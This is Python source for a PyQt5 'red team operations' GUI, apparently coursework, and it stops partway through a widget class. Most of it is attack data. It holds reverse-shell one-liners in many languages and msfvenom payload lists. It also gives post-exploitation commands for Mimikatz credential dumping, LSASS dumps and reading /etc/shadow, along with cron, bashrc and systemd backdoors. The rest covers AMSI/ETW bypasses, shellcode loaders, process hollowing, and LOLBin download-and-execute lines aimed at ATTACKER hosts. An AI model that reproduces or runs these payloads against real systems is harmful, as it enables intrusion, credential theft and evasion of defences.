#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║    PHANTOM  ·  Advanced Red Team Operations Suite           ║
║    Cyber Warfare ZX310  ·  John Bryce / ThinkCyber          ║
║    Modules: Advanced Payloads I&II · Post-Ex · Evasion      ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import base64
import urllib.parse
import codecs
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QLabel, QPushButton, QLineEdit, QTextEdit, QComboBox,
    QFrame, QGridLayout, QSpinBox, QGroupBox, QListWidget, QCheckBox,
    QSplitter
)
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QFont, QColor

# ══════════════════════════════════════════════════════════════
#  THEME CONSTANTS
# ══════════════════════════════════════════════════════════════

BG_DEEP   = "#05080f"
BG_CARD   = "#0a0f1e"
BG_PANEL  = "#0d1424"
BG_INPUT  = "#0f1929"
ACCENT    = "#00d4ff"
ACCENT2   = "#7c3aed"
GREEN     = "#10e88a"
AMBER     = "#f5a623"
RED       = "#ff3b5c"
TEXT1     = "#dce8f5"
TEXT2     = "#6b85a0"
BORDER    = "#162035"
BORDER2   = "#1e2d4a"

STYLESHEET = f"""
/* ── Base ── */
QMainWindow, QWidget {{
    background-color: {BG_DEEP};
    color: {TEXT1};
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
}}

/* ── Tabs ── */
QTabWidget::pane {{
    border: 1px solid {BORDER2};
    background-color: {BG_CARD};
    border-radius: 10px;
    top: -1px;
}}
QTabBar::tab {{
    background-color: {BG_PANEL};
    color: {TEXT2};
    padding: 9px 18px;
    margin-right: 3px;
    border-radius: 7px 7px 0 0;
    font-size: 10px;
    font-weight: bold;
    letter-spacing: 1.5px;
}}
QTabBar::tab:selected {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 #1a0a40, stop:1 #001a2e);
    color: {ACCENT};
    border-bottom: 2px solid {ACCENT};
}}
QTabBar::tab:hover:!selected {{
    background-color: #111d30;
    color: {ACCENT};
}}

/* ── Buttons ── */
QPushButton {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 #061828, stop:1 #0c2a44);
    color: {ACCENT};
    border: 1px solid {ACCENT};
    border-radius: 7px;
    padding: 9px 20px;
    font-size: 10px;
    font-weight: bold;
    letter-spacing: 2px;
    min-height: 18px;
}}
QPushButton:hover {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 {ACCENT}, stop:1 #0099cc);
    color: #000;
    border: 1px solid #00ffff;
}}
QPushButton:pressed {{
    background: #004466;
    color: {ACCENT};
}}
QPushButton#green {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 #001f12, stop:1 #003320);
    color: {GREEN};
    border: 1px solid {GREEN};
}}
QPushButton#green:hover {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 {GREEN}, stop:1 #0aaa60);
    color: #000;
}}
QPushButton#red {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 #1f0010, stop:1 #330020);
    color: {RED};
    border: 1px solid {RED};
}}
QPushButton#red:hover {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 {RED}, stop:1 #cc0030);
    color: #fff;
}}
QPushButton#amber {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 #1f1200, stop:1 #332000);
    color: {AMBER};
    border: 1px solid {AMBER};
}}
QPushButton#amber:hover {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 {AMBER}, stop:1 #cc7a00);
    color: #000;
}}

/* ── Inputs ── */
QLineEdit, QSpinBox {{
    background-color: {BG_INPUT};
    color: {TEXT1};
    border: 1px solid {BORDER2};
    border-radius: 6px;
    padding: 7px 12px;
    font-size: 12px;
    font-family: 'Consolas', monospace;
}}
QLineEdit:focus, QSpinBox:focus {{
    border: 1px solid {ACCENT};
    background-color: #0d1e30;
}}
QSpinBox::up-button, QSpinBox::down-button {{
    background-color: {BORDER2};
    border-radius: 3px;
    width: 18px;
}}

/* ── ComboBox ── */
QComboBox {{
    background-color: {BG_INPUT};
    color: {TEXT1};
    border: 1px solid {BORDER2};
    border-radius: 6px;
    padding: 7px 12px;
    font-size: 12px;
    min-width: 140px;
}}
QComboBox:focus {{ border: 1px solid {ACCENT}; }}
QComboBox::drop-down {{ border: none; width: 24px; }}
QComboBox::down-arrow {{ color: {ACCENT}; width: 12px; height: 12px; }}
QComboBox QAbstractItemView {{
    background-color: {BG_PANEL};
    color: {TEXT1};
    selection-background-color: #0e2a40;
    border: 1px solid {BORDER2};
    outline: none;
}}

/* ── TextEdit (terminal look) ── */
QTextEdit {{
    background-color: #030609;
    color: #00e676;
    border: 1px solid {BORDER2};
    border-radius: 7px;
    padding: 10px;
    font-size: 12px;
    font-family: 'Consolas', 'Courier New', monospace;
    line-height: 1.5;
}}
QTextEdit:focus {{ border: 1px solid {ACCENT}; }}

/* ── ListWidget ── */
QListWidget {{
    background-color: {BG_PANEL};
    color: {TEXT1};
    border: 1px solid {BORDER2};
    border-radius: 7px;
    font-size: 11px;
    outline: none;
}}
QListWidget::item {{
    padding: 7px 12px;
    border-bottom: 1px solid {BORDER};
}}
QListWidget::item:selected {{
    background-color: #0e2a40;
    color: {ACCENT};
    border-left: 2px solid {ACCENT};
}}
QListWidget::item:hover:!selected {{
    background-color: #0a1a28;
}}

/* ── CheckBox ── */
QCheckBox {{
    color: {TEXT2};
    font-size: 11px;
    spacing: 8px;
}}
QCheckBox::indicator {{
    width: 14px; height: 14px;
    border: 1px solid {BORDER2};
    border-radius: 3px;
    background: {BG_INPUT};
}}
QCheckBox::indicator:checked {{
    background-color: {ACCENT};
    border: 1px solid {ACCENT};
}}

/* ── ScrollBar ── */
QScrollBar:vertical {{
    background: {BG_PANEL};
    width: 7px;
    border-radius: 3px;
    margin: 0;
}}
QScrollBar::handle:vertical {{
    background: {BORDER2};
    border-radius: 3px;
    min-height: 20px;
}}
QScrollBar::handle:vertical:hover {{ background: {ACCENT}; }}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}

/* ── GroupBox ── */
QGroupBox {{
    border: 1px solid {BORDER2};
    border-radius: 8px;
    margin-top: 14px;
    padding: 10px 6px 6px 6px;
    font-size: 10px;
    font-weight: bold;
    color: {ACCENT};
    letter-spacing: 1.5px;
}}
QGroupBox::title {{
    subcontrol-origin: margin;
    left: 12px;
    padding: 0 6px;
    background-color: {BG_DEEP};
    color: {ACCENT};
}}

/* ── Splitter ── */
QSplitter::handle {{
    background-color: {BORDER2};
    width: 1px;
}}
"""

# ══════════════════════════════════════════════════════════════
#  DATA
# ══════════════════════════════════════════════════════════════

PAYLOADS = {
    "Windows x64": {
        "Meterpreter / TCP":   "windows/x64/meterpreter/reverse_tcp",
        "Meterpreter / HTTPS": "windows/x64/meterpreter/reverse_https",
        "Shell / TCP":         "windows/x64/shell/reverse_tcp",
        "PowerShell":          "windows/x64/powershell_reverse_tcp",
        "Exec":                "windows/x64/exec",
    },
    "Windows x86": {
        "Meterpreter / TCP":   "windows/meterpreter/reverse_tcp",
        "Meterpreter / HTTPS": "windows/meterpreter/reverse_https",
        "Shell / TCP":         "windows/shell/reverse_tcp",
        "VNC Inject":          "windows/vncinject/reverse_tcp",
        "Bind TCP":            "windows/meterpreter/bind_tcp",
    },
    "Linux x64": {
        "Meterpreter / TCP":   "linux/x64/meterpreter/reverse_tcp",
        "Shell / TCP":         "linux/x64/shell/reverse_tcp",
        "Shell Bind":          "linux/x64/shell_bind_tcp",
        "Meterpreter Bind":    "linux/x64/meterpreter/bind_tcp",
    },
    "Linux x86": {
        "Shell / TCP":         "linux/x86/shell/reverse_tcp",
        "Meterpreter / TCP":   "linux/x86/meterpreter/reverse_tcp",
    },
    "Android": {
        "Meterpreter / TCP":   "android/meterpreter/reverse_tcp",
        "Meterpreter / HTTPS": "android/meterpreter/reverse_https",
    },
    "macOS x64": {
        "Shell / TCP":         "osx/x64/shell_reverse_tcp",
        "Meterpreter / TCP":   "osx/x64/meterpreter/reverse_tcp",
    },
    "Python": {
        "Shell TCP":           "python/shell_reverse_tcp",
        "Meterpreter":         "python/meterpreter/reverse_tcp",
    },
}

FORMATS = {
    "Windows": ["exe", "dll", "msi", "ps1", "hta", "vba", "psh"],
    "Linux":   ["elf", "raw", "elf-so"],
    "Web":     ["php", "asp", "aspx", "jsp", "war"],
    "Script":  ["py", "rb", "pl", "sh", "bash"],
    "Data":    ["raw", "hex", "base64", "c", "csharp"],
}

ENCODERS = [
    "none",
    "x86/shikata_ga_nai",
    "x86/countdown",
    "x86/jmp_call_additive",
    "x64/xor_dynamic",
    "cmd/powershell_base64",
    "php/base64",
]

SHELLS = {
    "Bash":             "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "Bash (mkfifo)":    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "Python 3":         "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "Python 2":         "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "PHP":              "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Perl":             "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "Ruby":             "ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "Netcat":           "nc -e /bin/sh {lhost} {lport}",
    "Netcat (OpenBSD)": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "PowerShell":       "$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$se=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($se,0,$se.Length);$s.Flush()}};$c.Close()",
    "PowerShell B64":   "powershell -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnAHsAbABoAG8AcwB0AH0AJwAsAHsAbABwAG8AcgB0AH0AKQA7AA==",
    "Socat":            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
    "Golang":           "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/rs.go && go run /tmp/rs.go",
    "Java":             "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()",
}

POST_WIN = {
    "System Recon": [
        ("System Info",          "systeminfo"),
        ("OS Architecture",      "wmic os get osarchitecture"),
        ("Hostname",             "hostname"),
        ("Environment Variables","set"),
        ("Installed Hotfixes",   "wmic qfe get Caption,Description,HotFixID,InstalledOn"),
        ("Installed Software",   "wmic product get Name,Version"),
        ("Drives",               "wmic logicaldisk get caption,description,freespace,size,volumename"),
    ],
    "Users & Privileges": [
        ("Current User",         "whoami"),
        ("All Privileges",       "whoami /all"),
        ("Local Users",          "net user"),
        ("Local Groups",         "net localgroup"),
        ("Administrators",       "net localgroup administrators"),
        ("Domain Users",         "net user /domain"),
        ("Domain Admins",        "net group 'Domain Admins' /domain"),
        ("UAC Config",           "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
    ],
    "Network": [
        ("IP Configuration",     "ipconfig /all"),
        ("ARP Table",            "arp -a"),
        ("Active Connections",   "netstat -ano"),
        ("Routing Table",        "route print"),
        ("DNS Cache",            "ipconfig /displaydns"),
        ("Firewall Status",      "netsh advfirewall show allprofiles"),
        ("Firewall Rules",       "netsh advfirewall firewall show rule name=all"),
        ("Hosts File",           "type C:\\Windows\\System32\\drivers\\etc\\hosts"),
        ("Shared Folders",       "net share"),
    ],
    "Processes & Services": [
        ("Running Processes",    "tasklist"),
        ("Processes w/ PID",     "tasklist /v"),
        ("Running Services",     "net start"),
        ("Services Detail",      "wmic service list brief"),
        ("Scheduled Tasks",      "schtasks /query /fo LIST /v"),
        ("Startup Programs",     "wmic startup get caption,command"),
    ],
    "Persistence": [
        ("Run Key (HKCU)",       "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        ("Run Key (HKLM)",       "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        ("RunOnce (HKLM)",       "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
        ("Scheduled Tasks",      "schtasks /query /fo LIST /v"),
        ("Boot Services",        "sc query type= all state= running"),
        ("Add Schtask",          "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\backdoor.exe\" /sc onlogon /ru system"),
    ],
    "Credential Access": [
        ("Mimikatz LogonPasswds","privilege::debug\nsekurlsa::logonpasswords"),
        ("Mimikatz NTLM Hashes", "privilege::debug\nlsadump::sam"),
        ("Mimikatz DCSync",      "privilege::debug\nlsadump::dcsync /domain:DOMAIN /user:Administrator"),
        ("LSASS Dump (procdump)","procdump.exe -accepteula -ma lsass.exe lsass.dmp"),
        ("Saved Credentials",    "cmdkey /list"),
        ("WiFi Passwords",       "netsh wlan show profile name=* key=clear"),
        ("Browser Credentials",  "dir /s /b %USERPROFILE%\\AppData\\Roaming\\*pass* 2>nul"),
    ],
    "Lateral Movement": [
        ("PSExec (Sysinternals)", "PsExec.exe \\\\TARGET -u DOMAIN\\user -p pass cmd.exe"),
        ("WMI Exec",             "wmic /node:TARGET process call create \"cmd.exe /c whoami > C:\\out.txt\""),
        ("PSRemoting",           "Enter-PSSession -ComputerName TARGET -Credential $cred"),
        ("Pass the Hash",        "sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe"),
        ("SMB Mount",            "net use \\\\TARGET\\C$ /user:DOMAIN\\USER PASS"),
        ("RDP Enable",           "reg add HKLM\\System\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f"),
    ],
}

POST_LIN = {
    "System Recon": [
        ("Kernel & OS",          "uname -a && cat /etc/os-release"),
        ("CPU Info",             "lscpu"),
        ("Memory",               "free -h"),
        ("Disk Usage",           "df -h"),
        ("Uptime",               "uptime"),
        ("Environment Vars",     "env"),
        ("Mounted Filesystems",  "mount | column -t"),
    ],
    "Users & Privileges": [
        ("Current User",         "id && whoami"),
        ("Who Is Logged In",     "who && w"),
        ("All Users",            "cat /etc/passwd | cut -d: -f1"),
        ("Sudo Rights",          "sudo -l"),
        ("SUID Binaries",        "find / -perm -4000 -type f 2>/dev/null"),
        ("SGID Binaries",        "find / -perm -2000 -type f 2>/dev/null"),
        ("Writable Directories", "find / -writable -type d 2>/dev/null | grep -v proc"),
        ("Capabilities",         "getcap -r / 2>/dev/null"),
    ],
    "Network": [
        ("IP Addresses",         "ip a"),
        ("Routing Table",        "ip route"),
        ("ARP Table",            "ip neigh"),
        ("Open Ports",           "ss -tulpn"),
        ("Active Connections",   "netstat -auntp 2>/dev/null"),
        ("Hosts File",           "cat /etc/hosts"),
        ("DNS Config",           "cat /etc/resolv.conf"),
        ("Firewall Rules",       "iptables -L -n -v 2>/dev/null"),
        ("Network Interfaces",   "ifconfig -a 2>/dev/null || ip link"),
    ],
    "Processes & Cron": [
        ("Running Processes",    "ps auxf"),
        ("Cron (system)",        "cat /etc/crontab"),
        ("Cron (all dirs)",      "ls -la /etc/cron.*"),
        ("User Cron",            "crontab -l"),
        ("Services (systemd)",   "systemctl list-units --type=service --state=running"),
        ("Init Scripts",         "ls /etc/init.d/"),
        ("Process w/ Paths",     "ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head"),
    ],
    "Credential Access": [
        ("Shadow File",          "cat /etc/shadow"),
        ("SSH Private Keys",     "find / -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null"),
        ("Bash History",         "cat ~/.bash_history; cat /root/.bash_history 2>/dev/null"),
        ("Grep Passwords",       "grep -rn 'password\\|passwd\\|pwd' /etc/ 2>/dev/null | head -30"),
        ("MySQL History",        "cat ~/.mysql_history 2>/dev/null"),
        ("Git Credentials",      "find / -name '.git-credentials' 2>/dev/null -exec cat {} \\;"),
        ("Config Files",         "find / -name '*.conf' -o -name '*.config' 2>/dev/null | head -20"),
    ],
    "Persistence": [
        ("Bashrc Backdoor",      "echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> ~/.bashrc"),
        ("Cron Backdoor",        "(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1') | crontab -"),
        ("SSH Authorized Keys",  "mkdir -p ~/.ssh && echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"),
        ("SUID Bash",            "cp /bin/bash /tmp/.hidden_bash && chmod +s /tmp/.hidden_bash"),
        ("Motd Backdoor",        "echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /etc/update-motd.d/00-header"),
        ("Systemd Service",      "[Unit]\nDescription=Network Service\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target"),
    ],
}

EVASION_DATA = {
    "AMSI Bypass": [
        {
            "name": "AMSI AmsiUtils Patch",
            "platform": "Windows / PowerShell",
            "desc": "Patches amsiInitFailed field via reflection. Forces AMSI to believe initialization failed, disabling scanning for the current PowerShell session.",
            "code": '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        },
        {
            "name": "AMSI Context Null Patch",
            "platform": "Windows / PowerShell",
            "desc": "Overwrites the AMSI context pointer in memory to null, preventing the AMSI provider from scanning content.",
            "code": '$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)',
        },
        {
            "name": "AMSI DLL Unhooking",
            "platform": "Windows / C/C++",
            "desc": "Restores original bytes of AmsiScanBuffer in amsi.dll to bypass hooks placed by AV/EDR solutions at runtime.",
            "code": "// Patch AmsiScanBuffer in amsi.dll\nDWORD oldProtect;\nVirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);\nmemcpy(pAmsiScanBuffer, \"\\xB8\\x57\\x00\\x07\\x80\\xC3\", 6); // mov eax, 0x80070057; ret\nVirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);",
        },
        {
            "name": "ETW Patch (Telemetry Disable)",
            "platform": "Windows / PowerShell",
            "desc": "Patches EtwEventWrite to return immediately, disabling PowerShell ETW-based logging that feeds AMSI and SIEM solutions.",
            "code": '$a=[Ref].Assembly.GetType("System.Diagnostics.Eventing.EventProvider");\n$b=$a.GetField("m_enabled","NonPublic,Instance");\n$c=[Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");\n$d=$c.GetField("etwProvider","NonPublic,Static").GetValue($null);\n$b.SetValue($d,0)',
        },
    ],
    "AV Evasion": [
        {
            "name": "Base64 Payload Encode",
            "platform": "Cross-platform",
            "desc": "Encodes a binary payload in Base64 to evade signature-based detection. Widely supported for initial staging and LOLBins.",
            "code": "# Encode payload\npython3 -c \"import base64; d=open('payload.exe','rb').read(); print(base64.b64encode(d).decode())\"\n\n# Decode and execute (Windows)\npowershell -c \"$b=[System.Convert]::FromBase64String('BASE64_HERE'); [IO.File]::WriteAllBytes('C:\\\\Windows\\\\Temp\\\\p.exe',$b)\"\nC:\\Windows\\Temp\\p.exe",
        },
        {
            "name": "XOR Shellcode Obfuscation",
            "platform": "Cross-platform / Python",
            "desc": "XOR-encodes shellcode bytes with a single-byte key. Runtime decoder loop is small enough to evade static pattern matching.",
            "code": "KEY = 0x41\n\n# Encode\nshellcode = b'\\x90\\xfc\\x48...'  # Your shellcode\nencoded = bytes([b ^ KEY for b in shellcode])\nprint(list(encoded))\n\n# Runtime decode stub (Python)\ndecoded = bytes([b ^ KEY for b in encoded])\n\nimport ctypes\nbuf = (ctypes.c_char * len(decoded))(*decoded)\nctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\nptr = ctypes.windll.kernel32.VirtualAlloc(None, len(decoded), 0x3000, 0x40)\nctypes.memmove(ptr, buf, len(decoded))\nctypes.windll.kernel32.CreateThread(None,0,ptr,None,0,None)",
        },
        {
            "name": "Sleep-Based Sandbox Evasion",
            "platform": "Cross-platform",
            "desc": "Sleeps for a duration exceeding sandbox analysis timeout (typically 60-90 seconds) before executing malicious payload. Simple and highly effective against automated sandboxes.",
            "code": "import time, os\n\n# Most sandboxes timeout after 60-90 seconds\ntime.sleep(120)\n\n# Check if sleep was skipped (sandbox acceleration detection)\nstart = time.time()\ntime.sleep(10)\nif time.time() - start < 9:\n    # Time was accelerated - likely sandbox\n    exit(0)\n\n# Proceed with payload only in real environment",
        },
        {
            "name": "Process Hollowing Concept",
            "platform": "Windows",
            "desc": "Spawns a legitimate process in suspended state, replaces its memory with malicious payload, then resumes. Evades process-name-based detection.",
            "code": "// 1. Create legitimate process suspended\nCreateProcess('C:\\\\Windows\\\\System32\\\\svchost.exe', NULL, NULL, NULL,\n              FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n\n// 2. Unmap original image from process memory\nNtUnmapViewOfSection(pi.hProcess, pBaseAddr);\n\n// 3. Allocate new memory and write payload\nVirtualAllocEx(pi.hProcess, pBaseAddr, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nWriteProcessMemory(pi.hProcess, pBaseAddr, payload_buf, payload_size, NULL);\n\n// 4. Set thread context to new entry point and resume\nSetThreadContext(pi.hThread, &ctx);\nResumeThread(pi.hThread);",
        },
        {
            "name": "Reflective DLL Injection",
            "platform": "Windows",
            "desc": "Loads a DLL from memory without writing to disk and without using LoadLibrary, evading file-based AV scanning and import-table monitoring.",
            "code": "# Using Metasploit reflective DLL loader:\nuse post/windows/manage/reflective_dll_inject\nset SESSION 1\nset DLL /path/to/payload.dll\nset PID <target_pid>\nrun\n\n# Or with PowerShell Empire / manual:\n# Inject DLL bytes directly into remote process memory\n# without touching disk - pure in-memory execution",
        },
    ],
    "Living Off The Land": [
        {
            "name": "certutil Download",
            "platform": "Windows (Built-in)",
            "desc": "Uses Windows certutil.exe (certificate utility) to download remote files. Trusted signed binary, commonly whitelisted by application control policies.",
            "code": "# Download and decode (base64 method - evades URL filtering)\ncertutil.exe -urlcache -split -f http://ATTACKER/payload.exe C:\\Windows\\Temp\\p.exe\n\n# Alternative: base64 decode\ncertutil.exe -decode payload_b64.txt payload.exe",
        },
        {
            "name": "mshta.exe HTA Execution",
            "platform": "Windows (Built-in)",
            "desc": "Executes remote HTML Applications via mshta.exe. Bypasses AppLocker since mshta is a trusted Windows binary. Supports JavaScript/VBScript with full COM access.",
            "code": "# Execute remote HTA\nmshta.exe http://ATTACKER_IP/evil.hta\n\n# Sample evil.hta content:\n<script language=\"VBScript\">\n  Set objShell = CreateObject(\"WScript.Shell\")\n  objShell.Run \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/ps.ps1')\"\n  Close\n</script>",
        },
        {
            "name": "regsvr32 Squiblydoo",
            "platform": "Windows (Built-in)",
            "desc": "Uses regsvr32.exe to execute remote scriptlets (.sct). Bypasses AppLocker default rules and doesn't require admin rights. Very stealthy.",
            "code": "# Squiblydoo technique\nregsvr32.exe /s /n /u /i:http://ATTACKER_IP/file.sct scrobj.dll\n\n# Sample .sct (scriptlet):\n<?XML version=\"1.0\"?>\n<scriptlet>\n  <registration progid=\"test\" classid=\"{GUID}\">\n    <script language=\"JScript\">\n      var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe /c whoami\");\n    </script>\n  </registration>\n</scriptlet>",
        },
        {
            "name": "wmic XSL Execution",
            "platform": "Windows (Built-in)",
            "desc": "Abuses wmic.exe /format flag to load a remote XSL stylesheet containing JScript or VBScript. Bypasses AppLocker and leaves minimal footprint.",
            "code": "# Execute remote XSL\nwmic os get /format:\"http://ATTACKER_IP/evil.xsl\"\n\n# evil.xsl content:\n<?xml version='1.0'?>\n<stylesheet xmlns=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\">\n<template match=\"/\">\n<script xmlns=\"urn:schemas-microsoft-com:xslt\" language=\"JScript\">\n  var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c whoami > C:\\\\out.txt\");\n</script>\n</template>\n</stylesheet>",
        },
        {
            "name": "bitsadmin Download",
            "platform": "Windows (Built-in)",
            "desc": "Background Intelligent Transfer Service (BITS) is a legitimate Windows update mechanism. Using bitsadmin to download files is often whitelisted and logged differently than web requests.",
            "code": "bitsadmin /transfer job /download /priority high http://ATTACKER/payload.exe C:\\Windows\\Temp\\update.exe\n\n# BITS also persists across reboots if not cleaned up:\nbitsadmin /create /download MyJob\nbitsadmin /addfile MyJob http://ATTACKER/payload.exe C:\\payload.exe\nbitsadmin /resume MyJob",
        },
    ],
    "Network Evasion": [
        {
            "name": "DNS Tunneling (dnscat2)",
            "platform": "Cross-platform",
            "desc": "Encodes C2 traffic as DNS queries/responses. DNS is rarely blocked and often not deeply inspected, making it ideal for egress through strict firewalls.",
            "code": "# Server (attacker):\ngem install dnscat2\nruby dnscat2.rb --dns 'domain=c2.evil.com,server=ATTACKER_IP'\n\n# Client (victim - Windows):\ndnscat2-v0.07-client-win32.exe --secret=SECRET c2.evil.com\n\n# Or via PowerShell:\nIEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/dnscat.ps1')\nStart-Dnscat2 -DNSserver ATTACKER_IP -Domain c2.evil.com -PreSharedSecret SECRET",
        },
        {
            "name": "HTTPS Meterpreter (Port 443)",
            "platform": "Windows",
            "desc": "Routes Meterpreter through HTTPS on port 443. Traffic is encrypted and blends with normal web browsing. Most firewalls allow outbound HTTPS.",
            "code": "# Generate payload:\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe > update.exe\n\n# Listener (msf):\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_https\nset LHOST 0.0.0.0\nset LPORT 443\nset HandlerSSLCert /path/to/cert.pem\nset StagerVerifySSLCert true\nexploit -j",
        },
        {
            "name": "Malleable C2 Profile",
            "platform": "Windows / Cobalt Strike",
            "desc": "Customizes C2 traffic to mimic legitimate services (Amazon, Microsoft CDN, etc.). Highly effective against network-based threat hunting and IDS signatures.",
            "code": "# Example Cobalt Strike Malleable C2 (Amazon)\nset sleeptime \"5000\";\nset jitter \"10\";\nhttp-get {\n    set uri \"/s/ref=nb_sb_noss\";\n    client {\n        header \"Host\" \"www.amazon.com\";\n        header \"Accept\" \"*/*\";\n        header \"User-Agent\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\";\n        metadata { base64url; prepend \"session-id=\"; header \"Cookie\"; }\n    }\n}",
        },
    ],
}


# ══════════════════════════════════════════════════════════════
#  REUSABLE WIDGETS
# ══════════════════════════════════════════════════════════════

def make_separator():
    sep = QFrame()
    sep.setFrameShape(QFrame.HLine)
    sep.setStyleSheet(f"color: {BORDER2}; margin: 4px 0;")
    return sep


def section_label(text):
    lbl = QLabel(text)
    lbl.setStyleSheet(f"""
        color: {ACCENT};
        font-size: 9px;
        font-weight: bold;
        letter-spacing: 3px;
        padding: 3px 0 2px 2px;
        border-bottom: 1px solid {BORDER2};
        margin-bottom: 4px;
    """)
    return lbl


class TerminalOutput(QTextEdit):
    """Read-only terminal-style output box."""
    def __init__(self, height=None, parent=None):
        super().__init__(parent)
        self.setReadOnly(True)
        if height:
            self.setFixedHeight(height)


class CopyBtn(QPushButton):
    """Button that copies target widget content."""
    def __init__(self, target, label="⎘  COPY", parent=None):
        super().__init__(label, parent)
        self.setObjectName("green")
        self.setFixedWidth(110)
        self.target = target
        self.clicked.connect(self._copy)

    def _copy(self):
        QApplication.clipboard().setText(self.target.toPlainText())
        old = self.text()
        self.setText("✓  COPIED!")
